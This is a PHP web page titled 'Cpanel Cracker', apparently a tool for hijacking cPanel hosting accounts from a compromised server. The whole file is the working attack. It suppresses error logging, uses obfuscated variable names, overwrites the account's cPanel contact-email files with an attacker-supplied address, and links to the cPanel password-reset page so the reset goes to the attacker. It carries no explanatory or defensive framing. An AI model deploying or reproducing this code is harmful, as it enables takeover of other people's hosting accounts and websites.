<!DOCTYPE Html>
<html>

<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
</head>

<style>
    * {
        font-family: "montserrat", sans-serif;
    }

    body {
        margin: 0;
        padding: 0;
        background: #333;
    }

    .login-box {
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100vh;
        background-image: linear-gradient(45deg, black, gray);
        transition: 1s;
    }

    .clear {
        clear: both
    }

    .login-form {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        color: white;
        text-align: center;
    }

    .login-form h1 {
        font-weight: 400;
        margin-top: 0;
    }

    .txtb {
        display: block;
        box-sizing: border-box;
        width: 240px;
        background: #ffffff28;
        border: 1px solid white;
        padding: 10px 20px;
        color: white;
        outline: none;
        margin: 10px 0;
        border-radius: 6px;
        text-align: center;
    }

    .login-btn {
        width: 240px;
        background: #2c3e50;
        border: 0;
        color: white;
        padding: 10px;
        border-radius: 6px;
        cursor: pointer;
    }

    .hide-login-btn {
        color: #000;
        position: absolute;
        top: 40px;
        right: 40px;
        cursor: pointer;
        font-size: 24px;
        opacity: .7;
    }

    .show-login-btn {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        color: white;
        border: 2px solid;
        padding: 10px;
        cursor: pointer;
    }

    .showed {
        left: 0;
    }
</style>
<?php
echo '<!DOCTYPE HTML>
    <html> <head> 
    <title>Cpanel Cracker</title>
       </head> <center> <header> 
       <pre> 
<div class="show-login-btn"><i class="fas fa-sign-in-alt"></i> Go To Login Member</div>
<div class="login-box">
<div class="hide-login-btn"><i class="fas fa-times"></i></div>
<form class="login-form"action="#" method="post"><h1>Crack Cpanel</h1>
<input class="txtb" type="email" name="email" placeholder="tampanskyyt@gmail.com" />
<input class="login-btn" type="submit" name="submit" value="Submit"/>
<center>
<p>&copy;PanthomSkyCoderTeamz</p>
    </center></form>';

@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
header("X-XSS-Protection: 0");
ini_set('display_errors', FALSE);
ini_set("memory_limit", "2000M");
ini_set("safe_mode", "off");
session_start();
$IIIIIIIIIIII = get_current_user();
$IIIIIIIIIII1 = $_SERVER['HTTP_HOST'];
$IIIIIIIIIIlI = getenv('REMOTE_ADDR');
if (isset($_POST['submit'])) {
    $email = $_POST['email'];
    $IIIIIIIIIIl1 = 'email:' . $email;
    $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w');
    fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
    fclose($IIIIIIIIII1I);
    $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w');
    fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
    fclose($IIIIIIIIII1I);
    $IIIIIIIIIlIl = "https://";
    $IIIIIIIIIlI1 = "2083";
    $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
    $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
    if (!$read_named_conf) {
        echo "<h1>Akses Ga Bisa Mhank [Dir / Cpanel Not Found]</h1><br><br> </pre></center>";
    } else {
        echo "<center>Salin ini Bambank <br><br></center>";
        echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">ini usernya</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> ';
        echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">OTW Cpanel</a><br><br></center>';;
    }
}
?>
<script type="text/javascript">
    $(".show-login-btn").on("click", function() {
        $(".login-box").toggleClass("showed");
    });
    $(".hide-login-btn").on("click", function() {
        $(".login-box").toggleClass("showed");
    });
</script>